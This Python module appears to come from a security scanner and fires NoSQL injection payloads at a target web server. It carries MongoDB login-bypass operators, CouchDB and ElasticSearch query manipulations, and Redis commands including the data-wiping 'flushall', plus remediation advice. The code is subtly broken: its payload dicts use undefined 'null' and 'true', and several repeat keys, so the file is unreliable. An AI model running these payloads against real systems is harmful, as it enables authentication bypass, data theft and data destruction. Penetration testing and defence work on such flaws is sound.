"""NoSQL Injection Testing Module

Tests for NoSQL injection vulnerabilities in MongoDB, CouchDB, Redis,
ElasticSearch, and other NoSQL databases. Includes JSON operator manipulation,
view parameter manipulation, command injection via Redis protocol, and
query DSL manipulation.
"""

import requests
import json
import time
import sys
import os
from urllib.parse import urlparse, parse_qs
import re

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.color_compat import colored
from utils.ascii_art import AsciiArt


class NoSQLInjection:
    """NoSQL injection testing suite"""

    def __init__(self, target):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'CyberGuardian/2.0',
            'Content-Type': 'application/json'
        })

        # NoSQL injection payloads for different databases
        self.mongodb_payloads = [
            # Basic bypass techniques
            {"username": {"$ne": null}, "password": {"$ne": null}},
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$regex": "^admin"}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},

            # Authentication bypass
            {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": null}},
            {"username": {"$nin": []}, "password": {"$ne": null}},

            # Boolean-based injection
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$exists": true}, "password": {"$exists": true}},

            # Advanced operators
            {"username": {"$where": "return true"}, "password": {"$ne": null}},
            {"username": {"$expr": {"$gt": ["$password", ""]}}, "password": {"$ne": null}},

            # Array manipulation
            {"username": {"$all": ["admin"]}, "password": {"$ne": null}},
            {"username": {"$size": 1}, "password": {"$ne": null}},
        ]

        self.couchdb_payloads = [
            # View parameter manipulation
            {"key": {"$gt": null}},
            {"startkey": "", "endkey": {"$regex": ".*"}},
            {"limit": 999999},
            {"skip": 0},

            # Document manipulation
            {"_id": {"$gt": null}},
            {"_rev": {"$ne": null}},
            {"type": {"$regex": ".*"}},
        ]

        self.redis_payloads = [
            # Redis command injection
            "eval \"return 1\" 0",
            "config get *",
            "info",
            "keys *",
            "flushall",
            "set test 1",

            # Protocol manipulation
            "\\r\\n*1\\r\\n$4\\r\\nINFO\\r\\n",
            "\\r\\n*2\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nGET\\r\\n",
        ]

        self.elasticsearch_payloads = [
            # Query DSL manipulation
            {"query": {"match_all": {}}},
            {"query": {"bool": {"must": [{"match_all": {}}]}}},
            {"query": {"wildcard": {"_all": "*"}}},
            {"query": {"regexp": {"_all": ".*"}}},
            {"query": {"fuzzy": {"_all": "admin"}}},

            # Script injection
            {"query": {"script": {"script": "1==1"}}},
            {"query": {"function_score": {"script_score": {"script": "Math.random()"}}}},

            # Aggregation pipeline injection
            {"aggs": {"test": {"terms": {"field": "*"}}}},
            {"aggs": {"test": {"stats": {"field": "*"}}}},
        ]

    def test_nosql_injection(self):
        """Main NoSQL injection testing function"""
        print(colored("\n╔═══════════════════ NOSQL INJECTION TESTING ══════════════════════╗", 'red', attrs=['bold']))
        print(f"\n{colored('Target:', 'yellow')} {self.target}\n")

        try:
            results = {
                'mongodb': self._test_mongodb_injection(),
                'couchdb': self._test_couchdb_injection(),
                'redis': self._test_redis_injection(),
                'elasticsearch': self._test_elasticsearch_injection(),
                'generic_json': self._test_generic_json_injection()
            }

            self._print_summary(results)
            return results

        except Exception as e:
            AsciiArt.error_message(f"NoSQL injection test failed: {str(e)}")
            return {}

    def _test_mongodb_injection(self):
        """Test for MongoDB injection vulnerabilities"""
        print(f"{colored('Testing MongoDB injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Test login forms
        login_endpoints = ['/login', '/auth', '/api/login', '/api/auth', '/user/login']

        for endpoint in login_endpoints:
            try:
                url = f"{self.target.rstrip('/')}{endpoint}"

                for payload in self.mongodb_payloads:
                    try:
                        response = self.session.post(url, json=payload, timeout=10, verify=False)

                        # Check for successful login bypass
                        if response.status_code == 200 and 'token' in response.text.lower():
                            results['vulnerable'] = True
                            results['payloads'].append(payload)
                            results['endpoints'].append(endpoint)
                            print(f"  {colored('✗ MongoDB Injection Found:', 'red', attrs=['bold'])} {endpoint}")
                            print(f"    Payload: {colored(str(payload), 'yellow')}")
                            return results

                    except:
                        continue

            except:
                continue

        # Test API endpoints
        api_endpoints = ['/api/users', '/api/data', '/users', '/data']

        for endpoint in api_endpoints:
            try:
                url = f"{self.target.rstrip('/')}{endpoint}"

                for payload in self.mongodb_payloads:
                    try:
                        response = self.session.get(url, params=payload, timeout=10, verify=False)

                        # Check for data leakage
                        if response.status_code == 200 and len(response.text) > 1000:
                            try:
                                data = response.json()
                                if isinstance(data, list) and len(data) > 1:
                                    results['vulnerable'] = True
                                    results['payloads'].append(payload)
                                    results['endpoints'].append(endpoint)
                                    print(f"  {colored('✗ MongoDB Data Leakage:', 'red', attrs=['bold'])} {endpoint}")
                                    print(f"    Payload: {colored(str(payload), 'yellow')}")
                                    return results
                            except:
                                pass

                    except:
                        continue

            except:
                continue

        print(f"  {colored('✓ MongoDB injection not detected', 'green')}")
        return results

    def _test_couchdb_injection(self):
        """Test for CouchDB injection vulnerabilities"""
        print(f"{colored('Testing CouchDB injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # CouchDB specific endpoints
        couchdb_endpoints = ['/_utils/', '/_session', '/_all_dbs', '/_users']

        for endpoint in couchdb_endpoints:
            try:
                url = f"{self.target.rstrip('/')}{endpoint}"

                for payload in self.couchdb_payloads:
                    try:
                        response = self.session.get(url, params=payload, timeout=10, verify=False)

                        # Check for CouchDB response patterns
                        if response.status_code == 200 and ('db_name' in response.text or 'total_rows' in response.text):
                            results['vulnerable'] = True
                            results['payloads'].append(payload)
                            results['endpoints'].append(endpoint)
                            print(f"  {colored('✗ CouchDB Access:', 'red', attrs=['bold'])} {endpoint}")
                            print(f"    Payload: {colored(str(payload), 'yellow')}")
                            return results

                    except:
                        continue

            except:
                continue

        print(f"  {colored('✓ CouchDB injection not detected', 'green')}")
        return results

    def _test_redis_injection(self):
        """Test for Redis injection vulnerabilities"""
        print(f"{colored('Testing Redis injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Test for Redis protocol injection
        for payload in self.redis_payloads:
            try:
                # Try injecting Redis commands into various parameters
                test_params = {'data': payload, 'key': payload, 'value': payload}

                for param_name, param_value in test_params.items():
                    try:
                        # Test multiple endpoints
                        for endpoint in ['/api', '/data', '/cache', '/store']:
                            url = f"{self.target.rstrip('/')}{endpoint}"

                            response = self.session.post(url, data={param_name: param_value}, timeout=10, verify=False)

                            # Check for Redis response patterns
                            redis_patterns = [
                                r'\$.*\r\n',  # Redis bulk string
                                r'\*.*\r\n',  # Redis array
                                r':.*\r\n',   # Redis integer
                                r'\+.*\r\n',  # Redis simple string
                                r'-.*\r\n',   # Redis error
                            ]

                            for pattern in redis_patterns:
                                if re.search(pattern, response.text):
                                    results['vulnerable'] = True
                                    results['payloads'].append(payload)
                                    results['endpoints'].append(endpoint)
                                    print(f"  {colored('✗ Redis Injection Found:', 'red', attrs=['bold'])} {endpoint}")
                                    print(f"    Payload: {colored(payload, 'yellow')}")
                                    return results

                    except:
                        continue

            except:
                continue

        print(f"  {colored('✓ Redis injection not detected', 'green')}")
        return results

    def _test_elasticsearch_injection(self):
        """Test for ElasticSearch injection vulnerabilities"""
        print(f"{colored('Testing ElasticSearch injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # ElasticSearch specific endpoints
        es_endpoints = ['/_search', '/_mapping', '/_cat/indices', '/_cluster/health']

        for endpoint in es_endpoints:
            try:
                url = f"{self.target.rstrip('/')}{endpoint}"

                for payload in self.elasticsearch_payloads:
                    try:
                        response = self.session.post(url, json=payload, timeout=10, verify=False)

                        # Check for ElasticSearch response patterns
                        if response.status_code == 200 and ('hits' in response.text or 'mappings' in response.text):
                            results['vulnerable'] = True
                            results['payloads'].append(payload)
                            results['endpoints'].append(endpoint)
                            print(f"  {colored('✗ ElasticSearch Access:', 'red', attrs=['bold'])} {endpoint}")
                            print(f"    Payload: {colored(str(payload), 'yellow')}")
                            return results

                    except:
                        continue

            except:
                continue

        print(f"  {colored('✓ ElasticSearch injection not detected', 'green')}")
        return results

    def _test_generic_json_injection(self):
        """Test for generic JSON-based injection"""
        print(f"{colored('Testing generic JSON injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Generic JSON injection payloads
        generic_payloads = [
            # Operator injection
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$exists": True},
            {"$in": ["admin", "user", "test"]},

            # Recursive structures
            {"$and": [{"$ne": None}]},
            {"$or": [{"$gt": ""}]},
            {"$not": {"$eq": None}},

            # Array-based injection
            {"$elemMatch": {"$ne": None}},
            {"$all": ["*"]},
            {"$size": {"$gt": 0}},

            # Type manipulation
            {"$type": "string"},
            {"$mod": [1, 0]},
        ]

        # Test common API endpoints
        api_endpoints = ['/api', '/data', '/users', '/search', '/query']

        for endpoint in api_endpoints:
            try:
                url = f"{self.target.rstrip('/')}{endpoint}"

                for payload in generic_payloads:
                    try:
                        # Test both GET and POST
                        for method in ['GET', 'POST']:
                            if method == 'GET':
                                response = self.session.get(url, params=payload, timeout=10, verify=False)
                            else:
                                response = self.session.post(url, json=payload, timeout=10, verify=False)

                            # Check for unusual responses that might indicate injection
                            if (response.status_code == 200 and
                                len(response.text) > 100 and
                                'error' not in response.text.lower()[:100]):

                                # Try to parse as JSON to confirm it's valid data
                                try:
                                    data = response.json()
                                    if isinstance(data, (dict, list)) and len(str(data)) > 50:
                                        results['vulnerable'] = True
                                        results['payloads'].append(payload)
                                        results['endpoints'].append(f"{endpoint} ({method})")
                                        print(f"  {colored('✗ Generic JSON Injection:', 'red', attrs=['bold'])} {endpoint} ({method})")
                                        print(f"    Payload: {colored(str(payload), 'yellow')}")
                                        return results
                                except:
                                    pass

                    except:
                        continue

            except:
                continue

        print(f"  {colored('✓ Generic JSON injection not detected', 'green')}")
        return results

    def _test_parameter_pollution(self):
        """Test for parameter pollution in JSON requests"""
        print(f"{colored('Testing parameter pollution...', 'yellow')}")

        pollution_payloads = [
            # Duplicate parameters
            {"username": "admin", "username": {"$ne": None}},
            {"password": "test", "password": {"$gt": ""}},

            # Nested objects
            {"user": {"name": "test", "name": {"$regex": ".*"}}},
            {"data": {"id": 1, "id": {"$ne": null}}},
        ]

        results = {'vulnerable': False, 'payloads': []}

        for payload in pollution_payloads:
            try:
                url = f"{self.target.rstrip('/')}/api/login"
                response = self.session.post(url, json=payload, timeout=10, verify=False)

                if response.status_code == 200 and 'token' in response.text.lower():
                    results['vulnerable'] = True
                    results['payloads'].append(payload)
                    print(f"  {colored('✗ Parameter Pollution Found:', 'red', attrs=['bold'])}")
                    print(f"    Payload: {colored(str(payload), 'yellow')}")
                    return results

            except:
                continue

        print(f"  {colored('✓ Parameter pollution not detected', 'green')}")
        return results

    def _print_summary(self, results):
        """Print summary of NoSQL injection test results"""
        print(colored("╚═════════════════════════════════════════════════════════════════╝\n", 'red', attrs=['bold']))

        vulnerable_count = sum(1 for r in results.values() if isinstance(r, dict) and r.get('vulnerable'))
        total_tests = sum(1 for r in results.values() if isinstance(r, dict))

        print(f"{colored('NOSQL INJECTION SUMMARY:', 'yellow', attrs=['bold'])}")
        print(f"  • Tests performed: {colored(str(total_tests), 'green')}")
        print(f"  • Vulnerabilities found: {colored(str(vulnerable_count), 'red' if vulnerable_count > 0 else 'green')}")

        if vulnerable_count > 0:
            print(f"\n{colored('⚠ NOSQL VULNERABILITIES DETECTED:', 'red', attrs=['bold'])}")

            for db_type, result in results.items():
                if isinstance(result, dict) and result.get('vulnerable'):
                    print(f"  • {colored(db_type.upper(), 'red')}:")
                    for payload in result.get('payloads', [])[:3]:  # Show first 3 payloads
                        print(f"    - {colored(str(payload), 'yellow')}")
                    if result.get('endpoints'):
                        print(f"    Affected endpoints: {', '.join(result['endpoints'])}")

            print(f"\n{colored('🚨 HIGH RISK DETECTED:', 'red', attrs=['bold'])}")
            print(f"  • NoSQL injection can lead to:")
            print(f"    - Complete database compromise")
            print(f"    - Authentication bypass")
            print(f"    - Data exfiltration")
            print(f"    - Remote code execution (in some cases)")

            print(f"\n{colored('📋 REMEDIATION:', 'yellow', attrs=['bold'])}")
            print(f"  1. Use proper input validation and sanitization")
            print(f"  2. Implement parameterized queries for NoSQL databases")
            print(f"  3. Use whitelisting for allowed operators")
            print(f"  4. Apply principle of least privilege")
            print(f"  5. Use web application firewall (WAF) with NoSQL rules")
            print(f"  6. Regular security testing and code reviews\n")
        else:
            print(f"\n{colored('✓ No NoSQL injection vulnerabilities detected', 'green')}\n")